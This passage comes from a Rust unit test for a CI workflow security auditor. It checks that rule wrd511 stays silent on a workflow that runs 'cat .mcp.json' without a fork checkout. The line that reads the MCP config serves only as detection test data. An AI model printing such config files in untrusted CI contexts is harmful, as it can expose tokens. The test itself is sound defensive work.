    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cat .mcp.json
"#;
    let findings = audit_with(&wrd511::Wrd511, yaml);
    assert!(
        findings.is_empty(),
        "Should NOT fire when there is no fork checkout"
    );
}
